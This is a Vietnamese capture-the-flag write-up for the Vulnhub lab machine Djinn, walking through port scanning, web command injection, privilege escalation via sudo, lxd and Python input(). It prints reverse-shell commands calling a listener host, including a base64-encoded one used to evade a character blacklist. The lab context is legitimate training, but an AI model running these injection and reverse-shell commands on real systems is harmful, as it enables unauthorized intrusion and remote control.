# Mở đầu 
Chào các bạn, lâu lắm rồi mình chưa ra thêm bài viết nào cả vì mình lười. Do account HTB của mình (đi xin được) có nhiều người dùng nên không thể làm tiếp nên mình chuyển sang làm của Vulnhub. Mở đầu là bài Djinn
# Write-up
## Recon 
`nmap -A -p- 10.0.1.8 -o nmap`

![](https://images.viblo.asia/c51cc64b-f850-481f-9ca6-11506a18f71c.PNG)

Ta thấy có 3 cổng đang mở là 21, 1337 và 7331. Cổng 21 cho phép ta truy cập bằng anonymous. Tiến hành vào thử và download các file về.

![](https://images.viblo.asia/e388f3f3-979a-4c9a-a9b6-09bc1fd64066.PNG)

Sau khi đọc thì mình không thấy thông tin nào giá trị nên mình bỏ qua và tiếp tục đến cổng 1337 

`telnet 10.0.1.8 1337 `

![](https://images.viblo.asia/e46f1839-23a6-45a5-9a3d-9d90602652b5.PNG)

Ở đây có một game nho nhỏ là ta phải trả lời kết quả các phép tính 1000 lần :))). Nếu ta trả lời sai 1 câu thì phải làm lại từ đầu thế nên nếu làm bằng tay chắc dảk luôn.
Do gần đây mình đang thích Golang lên mình viết luôn một chương trình để trả lời 
[link](https://github.com/n00b-bot/Golang/blob/main/djinn.go)

Sau khi chạy ta được 3 số là 1356, 6784, 3409
![](https://images.viblo.asia/7598dd59-9c28-45a0-b979-f4ba13ebeaad.PNG)
Mình chưa biết dùng 3 số trên để làm gì nên tạm thời bỏ qua 

Tiếp theo là cổng cuối 7331. Đây là một Web server nên mình sẽ sử dụng gobuster để tìm xem có thư mục ẩn nào không \
`gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-big.txt -u 10.0.1.8   -x php,txt,bak -o gobuster`

Sau khi chạy gobuster thì mình tìm được 2 thư mục ẩn 
![](https://images.viblo.asia/665cc3c2-cf69-4bd6-9d77-e2ab9e0f2fb3.PNG)
## Exploit
### www-data
Thử vào thư mục wish 
![](https://images.viblo.asia/4d607d7a-3c2f-4d63-a4a9-7cd901f59430.PNG)
Mình nhập thử id và trang trả lại kết quả
![](https://images.viblo.asia/02076fe0-8890-4dfc-bdb7-0149533e20e1.PNG)
Vậy là trang cho phép thực thi command ta nhập vào lấy shell thôi 
`nc -e /bin/bash 10.0.1.4 443`
![](https://images.viblo.asia/3ef00a95-9bf3-4ed6-a489-6493899fa7c5.PNG)
Nhưng không dễ như thế trang web sẽ lọc các từ có trong blacklist và sau một hồi thử mình tìm được các kí tự trong blacklist: $ . / * ;

Vậy ta phải bypass bộ lọc trên, ở đây mình dùng base64 để encode và decode sau đó cho vào pipeline để thực thi lệnh. Shell mình dùng là `bash -i >& /dev/tcp/10.0.1.4/4242 0>&1`

Vậy ta phải nhập là 
`echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4wLjEuNC80MjQyIDA+JjE= | base64 -d | bash`
Ta có được shell đầu 
![](https://images.viblo.asia/5c0dde91-08f7-4ca8-8ece-9bc03e23ad11.PNG)
### nitish
Sau khi kiểm tra Sudo và các file co SUID không thấy có gì khả quan. Mình liệt kê người dùng có trong hệ thống và tìm kiếm trong thư mục home phát hiện một file chứa mật khẩu của user **nitish**

find /home 2>/dev/null 

![](https://images.viblo.asia/1c24e9f7-a6d3-4ed8-954e-8e8fd522bbfa.PNG)

Ta có shell của nitish 
![](https://images.viblo.asia/bfd80779-e1bf-4a1a-b6a7-4a7fc0ad48c5.PNG)
### sam
Kiểm tra với `sudo -l` ta thấy user này có thể chạy file genie dưới quyền **sam** mà không cần mật khẩu 

![](https://images.viblo.asia/4c45dad4-32ed-4ab0-b81c-c54bf0f5fc0e.PNG)

Sau nhiều giờ vật lộn thì mình tìm được một option ẩn bằng lệnh `man genie`
Và ta "dễ dàng" có shell tiếp theo 
![](https://images.viblo.asia/d5362c67-00bf-4448-822b-e7e808f0f9a2.PNG)
### root 
Sau khi làm xong mình đi tham khảo các bài writeup khác thì được biết có tận 3 cách để leo lên root
1. **Lxd**
        Đây là cách mình dùng để leo thang vì mình để ý ở lệnh id thì user này thuộc group lxd. Để leo thang bằng cách này thì các bạn làm theo các bước ở [đây](https://book.hacktricks.xyz/linux-unix/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
 2. **Input python**<br>
     Sử dụng `sudo -l` thì ta thấy user này có thể chạy file rago bằng quyền root nhưng thử qua ta thấy khá là vô dụng. Nếu để ý ở trong thư mục của sam thì ta sẽ thấy có một file .pyc thì đây là file source của file rago trong thư mục gốc. Vì là file .pyc nên ta có thể dễ dàng dịch ngược lại để xem code bên trong có gì. 

     ![](https://images.viblo.asia/070e162e-3da5-4ce5-9f85-0b9fb0148b70.PNG)
         
     Ở đây nếu ta đoán trúng số random thì sẽ có được shell vậy ta phải bypass được hàm so sánh ở trên. Sau khi tìm kiếm thì thì mình được biết nếu bạn nhập vào tên biến vào hàm input thì nó sẽ lấy giá trị và done!
3.  **Python sandbox trên cổng 1337**(Update soon)<br>
        Vì mình đang tìm hiểu nên chưa thể giải thích nên mình sẽ để link ở  [đây](https://book.hacktricks.xyz/misc/basic-python/bypass-python-sandboxes)
 # Conclusion
 Ở bài này mình học được cách khai thác hàm input của python, cách leo thang bằng lxd và biết đến python sandbox